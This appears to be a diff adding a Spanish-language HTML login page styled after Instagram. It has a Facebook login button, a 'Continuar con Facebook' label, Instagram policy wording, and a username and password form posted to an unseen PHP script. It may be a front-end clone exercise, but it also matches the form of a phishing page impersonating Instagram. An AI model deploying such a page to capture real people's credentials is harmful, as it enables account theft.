@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interfaz de Inicio de Sesión</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            font-size:small;
+            
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f2f2f2;
+            
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .login-container button.facebook-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877F2;
+            color: #ffffff;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .login-container .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #999;
+            margin: 20px 0;
+        }
+
+        .login-container .divider::before,
+        .login-container .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .login-container .divider:not(:empty)::before {
+            margin-right: .5em;
+        }
+
+        .login-container .divider:not(:empty)::after {
+            margin-left: .5em;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+        }
+
+        .login-container .forgot-password {
+            display: block;
+            margin: 10px 0;
+            color: #1877F2;
+            text-decoration: none;
+            text-align:right
+
+        }
+
+        .login-container button.login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CB5F9;
+            color: #ffffff;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .login-container .signup {
+            margin-top: 20px;
+            color: #666;
+        }
+
+        .login-container .signup a {
+            color: #1877F2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .logo {
+            width: 100%; /* Puedes ajustar el tamaño aquí */
+            height: auto; /* Mantiene la proporción de la imagen */
+            max-width: 50%; /* Limita el tamaño máximo */
+            margin-bottom: 20px;
+            object-fit: cover; /* Asegura que la imagen se recorte si es necesario */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="loo.png" alt="Logo" class="logo">
+        <!-- Botón de inicio de sesión con Facebook -->
+        <button class="facebook-login">Continuar con Facebook</button>
+
+        <!-- Línea divisoria -->
+        <div class="divider">O</div>
+
+        <!-- Campos de usuario y contraseña -->
+        <form action="enviar_formulario.php" method="post">
+            <input type="text" placeholder="Teléfono, usuario o correo electrónico" id="email" name="email" required><br><br>
+            <input type="password" placeholder="Contraseña" id="password" name="password" required><br><br>
+            
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            <button type="submit" value="Enviar" class="login-btn">Iniciar sesión</button>
+        </form>
+
+        <!-- Enlace de registro -->
+        <div class="signup">
+            ¿No tienes una cuenta? <a href="#">Regístrate</a>
+        </div>
+        <div class="signup">
+            Al continuar, aceptas las<b> Condiciones de uso</b> y la <b>Política de privacidad</b> de Instagram
+        </div>
+    </div>
+</body>
+</html>
